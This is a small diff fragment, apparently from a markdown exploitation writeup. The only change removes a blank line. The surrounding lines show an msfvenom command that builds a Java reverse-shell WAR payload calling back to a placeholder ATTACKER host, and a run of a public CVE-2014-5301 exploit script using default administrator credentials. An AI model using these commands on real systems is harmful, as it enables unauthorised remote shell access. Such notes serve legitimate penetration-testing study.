@@ -35,7 +35,6 @@ msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war > shell.war
 python3 CVE-2014-5301.py TARGET 8080 administrator administrator shell.war
 ```
 
-
 ### References
 
 - https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py
